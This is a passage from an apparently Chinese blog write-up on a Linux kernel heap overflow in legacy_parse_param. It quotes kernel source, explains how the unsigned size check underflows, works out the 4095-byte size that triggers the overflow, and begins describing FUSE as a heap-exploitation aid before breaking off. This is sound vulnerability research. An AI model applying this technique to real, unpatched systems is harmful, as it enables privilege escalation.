aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsmount</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">unsigned</span> <span class="keyword">int</span> ms_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move_mount</span><span class="params">(<span class="keyword">int</span> from_dfd, <span class="keyword">const</span> <span class="keyword">char</span> *from_pathname,<span class="keyword">int</span> to_dfd, </span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="keyword">const</span> <span class="keyword">char</span> *to_pathname, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_move_mount, from_dfd, from_pathname, to_dfd, to_pathname, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd, mount_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;/dev/sdb1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);</span><br><span class="line">    move_mount(mount_fd, <span class="string">&quot;&quot;</span>, AT_FDCWD, <span class="string">&quot;/mnt/temp&quot;</span>, MOVE_MOUNT_F_EMPTY_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>这里介绍几乎就是照抄a3和知乎的文章</del></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>前面提到在<code>fsconfig</code>函数中，最终会调用<code>vfs_fsconfig_locked</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">vfs_fsconfig_locked</span><span class="params">(struct fs_context *fc, <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="params"><span class="function">			       struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>;</span></span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = finish_clean_context(fc);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_CMD_CREATE:</span><br><span class="line">		<span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS)</span><br><span class="line">			<span class="keyword">return</span> -EBUSY;</span><br><span class="line">		<span class="keyword">if</span> (!mount_capable(fc))</span><br><span class="line">			<span class="keyword">return</span> -EPERM;</span><br><span class="line">		fc-&gt;phase = FS_CONTEXT_CREATING;</span><br><span class="line">		ret = vfs_get_tree(fc);</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		sb = fc-&gt;root-&gt;d_sb;</span><br><span class="line">		ret = security_sb_kern_mount(sb);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(ret)) &#123;</span><br><span class="line">			fc_drop_locked(fc);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		up_write(&amp;sb-&gt;s_umount);</span><br><span class="line">		fc-&gt;phase = FS_CONTEXT_AWAITING_MOUNT;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_CMD_RECONFIGURE:</span><br><span class="line">		<span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)</span><br><span class="line">			<span class="keyword">return</span> -EBUSY;</span><br><span class="line">		fc-&gt;phase = FS_CONTEXT_RECONFIGURING;</span><br><span class="line">		sb = fc-&gt;root-&gt;d_sb;</span><br><span class="line">		<span class="keyword">if</span> (!ns_capable(sb-&gt;s_user_ns, CAP_SYS_ADMIN)) &#123;</span><br><span class="line">			ret = -EPERM;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		down_write(&amp;sb-&gt;s_umount);</span><br><span class="line">		ret = reconfigure_super(fc);</span><br><span class="line">		up_write(&amp;sb-&gt;s_umount);</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		vfs_clean_context(fc);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS &amp;&amp;</span><br><span class="line">		    fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)</span><br><span class="line">			<span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> vfs_parse_fs_param(fc, param);</span><br><span class="line">	&#125;</span><br><span class="line">	fc-&gt;phase = FS_CONTEXT_FAILED;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到上述函数中依旧是根据cmd进入不同的swith分支</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">fsconfig_command</span> &#123;</span></span><br><span class="line">	FSCONFIG_SET_FLAG	= <span class="number">0</span>,	<span class="comment">/* Set parameter, supplying no value */</span></span><br><span class="line">	FSCONFIG_SET_STRING	= <span class="number">1</span>,	<span class="comment">/* Set parameter, supplying a string value */</span></span><br><span class="line">	FSCONFIG_SET_BINARY	= <span class="number">2</span>,	<span class="comment">/* Set parameter, supplying a binary blob value */</span></span><br><span class="line">	FSCONFIG_SET_PATH	= <span class="number">3</span>,	<span class="comment">/* Set parameter, supplying an object by path */</span></span><br><span class="line">	FSCONFIG_SET_PATH_EMPTY	= <span class="number">4</span>,	<span class="comment">/* Set parameter, supplying an object by (empty) path */</span></span><br><span class="line">	FSCONFIG_SET_FD		= <span class="number">5</span>,	<span class="comment">/* Set parameter, supplying an object by fd */</span></span><br><span class="line">	FSCONFIG_CMD_CREATE	= <span class="number">6</span>,	<span class="comment">/* Invoke superblock creation */</span></span><br><span class="line">	FSCONFIG_CMD_RECONFIGURE = <span class="number">7</span>,	<span class="comment">/* Invoke superblock reconfiguration */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>根据定义，最终会进入到<code>default</code>分支中，最终会调用<code>vfs_parse_fs_param</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_parse_fs_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!param-&gt;key)</span><br><span class="line">		<span class="keyword">return</span> invalf(fc, <span class="string">&quot;Unnamed parameter\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ret = vfs_parse_sb_flag(fc, param-&gt;key);</span><br><span class="line">	<span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = security_fs_context_parse_param(fc, param);</span><br><span class="line">	<span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line">		<span class="comment">/* Param belongs to the LSM or is disallowed by the LSM; so</span></span><br><span class="line"><span class="comment">		 * don&#x27;t pass to the FS.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;</span><br><span class="line">		ret = fc-&gt;ops-&gt;parse_param(fc, param);</span><br><span class="line">		<span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If the filesystem doesn&#x27;t take any arguments, give it the</span></span><br><span class="line"><span class="comment">	 * default handling of source.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (param-&gt;type != fs_value_is_string)</span><br><span class="line">			<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Non-string source&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (fc-&gt;source)</span><br><span class="line">			<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Multiple sources&quot;</span>);</span><br><span class="line">		fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">		param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> invalf(fc, <span class="string">&quot;%s: Unknown parameter &#x27;%s&#x27;&quot;</span>,</span><br><span class="line">		      fc-&gt;fs_type-&gt;name, param-&gt;key);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vfs_parse_fs_param);</span><br></pre></td></tr></table></figure>

<p>而在此函数中会调用到<code>fs_context-&gt;ops-&gt;parse_param</code>，接着根据前面在<code>legacy_init_fs_context</code>函数中会对<code>fs_context-&gt;ops</code>赋值为<code>legacy_fs_context_ops</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_context_operations</span> <span class="title">legacy_fs_context_ops</span> =</span> &#123;</span><br><span class="line">	.<span class="built_in">free</span>			= legacy_fs_context_free,</span><br><span class="line">	.dup			= legacy_fs_context_dup,</span><br><span class="line">	.parse_param		= legacy_parse_param,</span><br><span class="line">	.parse_monolithic	= legacy_parse_monolithic,</span><br><span class="line">	.get_tree		= legacy_get_tree,</span><br><span class="line">	.reconfigure		= legacy_reconfigure,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>根据前面所述，最终会调用到<code>legacy_parse_param</code>函数中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_parse_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">legacy_fs_context</span> *<span class="title">ctx</span> =</span> fc-&gt;fs_private;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size = ctx-&gt;data_size;</span><br><span class="line">	<span class="keyword">size_t</span> len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (param-&gt;type != fs_value_is_string)</span><br><span class="line">			<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Non-string source&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (fc-&gt;source)</span><br><span class="line">			<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Multiple sources&quot;</span>);</span><br><span class="line">		fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">		param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)</span><br><span class="line">		<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (param-&gt;type) &#123;</span><br><span class="line">	<span class="keyword">case</span> fs_value_is_string:</span><br><span class="line">		len = <span class="number">1</span> + param-&gt;size;</span><br><span class="line">		<span class="comment">/* Fall through */</span></span><br><span class="line">	<span class="keyword">case</span> fs_value_is_flag:</span><br><span class="line">		len += <span class="built_in">strlen</span>(param-&gt;key);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;</span>,</span><br><span class="line">			      param-&gt;key);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (len &gt; PAGE_SIZE - <span class="number">2</span> - size)</span><br><span class="line">		<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strchr</span>(param-&gt;key, <span class="string">&#x27;,&#x27;</span>) ||</span><br><span class="line">	    (param-&gt;type == fs_value_is_string &amp;&amp;</span><br><span class="line">	     <span class="built_in">memchr</span>(param-&gt;<span class="built_in">string</span>, <span class="string">&#x27;,&#x27;</span>, param-&gt;size)))</span><br><span class="line">		<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,</span><br><span class="line">			      param-&gt;key);</span><br><span class="line">	<span class="keyword">if</span> (!ctx-&gt;legacy_data) &#123;</span><br><span class="line">		ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!ctx-&gt;legacy_data)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ctx-&gt;legacy_data[size++] = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">	len = <span class="built_in">strlen</span>(param-&gt;key);</span><br><span class="line">	<span class="built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);</span><br><span class="line">	size += len;</span><br><span class="line">	<span class="keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;</span><br><span class="line">		ctx-&gt;legacy_data[size++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="built_in">string</span>, param-&gt;size);</span><br><span class="line">		size += param-&gt;size;</span><br><span class="line">	&#125;</span><br><span class="line">	ctx-&gt;legacy_data[size] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	ctx-&gt;data_size = size;</span><br><span class="line">	ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先在<code>ctx-&gt;data_size</code>中取出已拷贝的大小，随后根据<code>param-&gt;type</code>计算出len，若是不存在<code>ctx-&gt;legacy_data</code>则会申请一张页面大小，后续则是从<code>param</code>中取出数据写到<code>ctx-legacy_data</code>中去。</p>
<p>可以看到在计算出len之后其实是经过了一次判断的，<code>len &gt; PAGE_SIZE - 2 - size</code>这里就是其表达式，不过存在问题的是在函数开头定义<code>size</code>使用的是<code>unsigned int</code>，所以这个判断就成了无符号类型的判断了，一旦<code>size + 2</code>大于<code>PAGE_SIZE</code>那么这个判断是会一直成立的，从而达到了溢出的效果。</p>
<p>不过这里需要注意的是在前面的<code>fsconfig</code>系统调用实现的函数中在对<code>param</code>进行初始化时使用的是这样一条语句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br></pre></td></tr></table></figure>

<p>这里也就限制了我们单次写入的大小只能是<code>0x100</code>个字节，不过可以看到的是在<code>legacy_parse_param</code>函数末尾是又对<code>ctx-&gt;data_size</code>进行了赋值并且值的大小为<code>len + size</code>和<code>size += param-&gt;size;</code>，并且后面在拷贝的时候使用的是<code>ctx-&gt;legacy_data + size</code>。所以我们想要达到溢出的效果需要将<code>size</code>构造为4095。</p>
<p>前面提到了<code>size</code>最终的值是那两个的和，但其实还存在两个操作会对其做增加操作，也就是在每一条前面都会加上一个<code>&quot;,&quot;</code>而在key后面都会加上一个<code>&quot;=&quot;</code>所以其实写入的最终效果如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">,key=val</span><br></pre></td></tr></table></figure>

<p>所以每一次拷贝的长度其实是<code>strlen(key) + strlen(val) + 2</code></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以预见的是，当我们控制<code>size = 4095</code>时，他会在下一个相邻<code>object</code>写入<code>=</code>以及末尾的一个<code>\x00</code>，所以这里采取的办法是不直接覆盖相邻<code>object</code>的内容，而是直接覆盖掉后一个<code>object</code>的内容。</p>
<h3 id="FUSE"><a href="#FUSE" class="headerlink" title="FUSE"></a>FUSE</h3><p>在以往的文章中提到了<code>userfaultfd</code>系统调用，可惜的是在<code>Linux 5.11</code>起就不再能用普通用户进行调用了，然而其实<code>FUSE</code>也是可以达到重样的效果的。</p>
<p>首先简单介绍一下<code>FUSE</code>，即用户空间文件系统，该功能允许非特权用户在用户空间实现一个用户态文件系统，开发者只需要实现对应的文件操作接口就可以在用户空间实现一个文件系统，而不需要重新编译内核，这给开发者提供了相当的便利。</p>
<p><code>FUSE</code> 自 <code>Linux 2.6.14</code> 版本引入，主要由两部分组成：</p>
<ul>
<li>  FUSE 内核模块，负责与 kernel 的 VFS 进行交互，并向用户空间实现的文件系统进程暴露 <code>/dev/fuse</code> 块设备接口</li>
<li>  <a class="link"   target="_blank" rel="noopener" href="https://github.com/libfuse/libfuse" >用户空间的 libfuse 库<i class="fas fa-external-link-alt"></i></a> 负责向用户程序提供封装好的接口，开发者基于该库进行用户空间文件系统的开发：由一个 <code>FUSE daemon</code> 守护进程负责与内核模块进行交互并进行文件系统的具体操作</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/zDwY7GMZQkE2c9m.png"
                     
                ></p>
<p>FUSE 的基本运行原理如下：</p>
<ul>
<li>  <code>FUSE daemon</code> 守护进程通过 libfuse 库的 <code>fuse_main()</code> 注册文件系统与对应的处理函数，并挂载到对应的目录下（例如 <code>/mnt/fuse</code>）</li>
<li>  用户进程访问挂载点下的文件（例如 <code>/mnt/fuse/file</code>），来到内核中的 VFS 对应 inode 的 <code>inode_operations</code> 中的处理函数，交由 FUSE 内核模块进行处理</li>
<li>  FUSE 内核模块将请求转换为与用户态 daemon 进程间约定的格式，交由用户态对应的 <code>FUSE daemon</code> 守护进程进行处理</li>
<li>  在 <code>FUSE daemon</code> 调用文件系统创建时注册的对应的处理函数，这一步可能会需要访问实际的文件系统</li>
<li>  <code>FUSE daemon</code> 完成处理，返回结果至 FUSE 内核模块，再经由 VFS 返回给用户进程</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/9q3VSGepCnKzbuB.png"
                     
                ></p>
<p>这里不过多介绍了，后面就说说基本用法就行了，也和<code>userfaultfd</code>类似，是一个模板。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fuse_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*getattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct stat *, struct fuse_file_info *fi);</span><br><span class="line">	<span class="keyword">int</span> (*readlink) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">	<span class="keyword">int</span> (*mknod) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>, <span class="keyword">dev_t</span>);</span><br><span class="line">	<span class="keyword">int</span> (*mkdir) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>);</span><br><span class="line">	<span class="comment">/** Remove a file */</span></span><br><span class="line">	<span class="keyword">int</span> (*unlink) (<span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line">	<span class="comment">/** Remove a directory */</span></span><br><span class="line">	<span class="keyword">int</span> (*rmdir) (<span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line">	<span class="comment">/** Create a symbolic link */</span></span><br><span class="line">	<span class="keyword">int</span> (*symlink) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line">	<span class="keyword">int</span> (*rename) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags);</span><br><span class="line">	<span class="keyword">int</span> (*link) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line">	<span class="keyword">int</span> (*chmod) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>, struct fuse_file_info *fi);</span><br><span class="line">	<span class="keyword">int</span> (*chown) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">uid_t</span>, <span class="keyword">gid_t</span>, struct fuse_file_info *fi);</span><br><span class="line">	<span class="keyword">int</span> (*truncate) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">off_t</span>, struct fuse_file_info *fi);</span><br><span class="line">	<span class="keyword">int</span> (*open) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*read) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">		     struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*write) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">		      struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*statfs) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct statvfs *);</span><br><span class="line">	<span class="keyword">int</span> (*flush) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*release) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct 